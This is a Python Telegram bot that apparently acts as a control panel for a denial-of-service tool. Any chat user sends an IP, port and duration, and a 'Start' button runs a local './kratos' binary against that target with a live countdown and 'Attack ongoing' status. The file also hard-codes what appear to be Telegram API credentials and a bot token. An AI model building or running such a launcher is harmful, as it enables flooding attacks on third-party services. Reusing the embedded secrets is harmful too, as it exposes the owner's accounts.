from telethon import TelegramClient, events, Button
import asyncio
import os

# Replace with your own values
api_id = "22157690"
api_hash = "819a20b5347be3a190163fff29d59d81"
bot_token = "7483201528:AAElIxI0_iaD1lxxHwcXtPBYDqZHQkaKlpE"

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# Store running processes
running_processes = {}
message_cache = {}

@client.on(events.NewMessage(pattern=r"^(\d+\.\d+\.\d+\.\d+)\s(\d+)\s(\d+)$"))
async def handle_ip_port(event):
    ip, port, duration = event.pattern_match.groups()
    await event.respond(
        f"Received IP: {ip}, Port: {port}, Duration: {duration}\nChoose an action:",
        buttons=[
            [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
        ]
    )

@client.on(events.CallbackQuery(pattern=b"(start|stop)\|(\d+\.\d+\.\d+\.\d+)\|(\d+)(?:\|(\d+))?"))
async def handle_buttons(event):
    action, ip, port, duration = event.pattern_match.groups()
    chat_id = event.chat_id

    if action == b"start":
        if (chat_id, ip, port) in running_processes:
            await event.answer("Attack is already running!", alert=True)
            return

        duration = int(duration.decode()) if duration else 60
        await event.answer("Starting the attack...", alert=True)
        
        # Update message with attack starting status and countdown
        message = await event.edit(
            f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack ongoing\nTime: {duration}s",
            buttons=[
                [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
            ]
        )
        message_cache[(chat_id, ip, port)] = message
        
        process = await run_attack(chat_id, ip.decode(), port.decode(), duration, message)
        running_processes[(chat_id, ip, port)] = process

    elif action == b"stop":
        process = running_processes.pop((chat_id, ip, port), None)
        if process:
            process.terminate()
            await event.answer("Attack stopped successfully!", alert=True)
            
            # Update message to show attack stopped and remove time
            message = message_cache.get((chat_id, ip, port))
            if message:
                await message.edit(
                    f"IP: {ip.decode()}:{port.decode()}\nStatus: Attack stopped",
                    buttons=[
                        [Button.inline("Start", data=f"start|{ip.decode()}|{port.decode()}|{duration.decode()}"), Button.inline("Stop", data=f"stop|{ip.decode()}|{port.decode()}")]
                    ]
                )
                del message_cache[(chat_id, ip, port)]
        else:
            await event.answer("No running attack to stop!", alert=True)


async def run_attack(chat_id, ip, port, duration, message):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./kratos {ip} {port} {duration} 750",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Start countdown in background
        asyncio.create_task(countdown_timer(chat_id, ip, port, duration, message))
        # Monitor process in the background
        asyncio.create_task(monitor_process(chat_id, process))
        return process
    except Exception as e:
        await client.send_message(chat_id, f"Failed to start attack: {e}")
        return None

async def countdown_timer(chat_id, ip, port, duration, message):
    remaining_time = duration
    while remaining_time > 0:
        await asyncio.sleep(1)
        remaining_time -= 1
        await message.edit(
            f"IP: {ip}:{port}\nStatus: Attack ongoing\nTime: {remaining_time}s",
            buttons=[
                [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
            ]
        )
    # After countdown reaches 0, stop attack and update status
    if (chat_id, ip, port) in running_processes:
        await message.edit(
            f"IP: {ip}:{port}\nStatus: Attack stopped",
            buttons=[
                [Button.inline("Start", data=f"start|{ip}|{port}|{duration}"), Button.inline("Stop", data=f"stop|{ip}|{port}")]
            ]
        )
        del running_processes[(chat_id, ip, port)]

async def monitor_process(chat_id, process):
    try:
        stdout, stderr = await process.communicate()
        if stdout:
            await client.send_message(chat_id, f"Process output: {stdout.decode()}")
        if stderr:
            await client.send_message(chat_id, f"Process error: {stderr.decode()}")
    except Exception as e:
        await client.send_message(chat_id, f"Error monitoring process: {e}")

if __name__ == "__main__":
    client.run_until_disconnected()
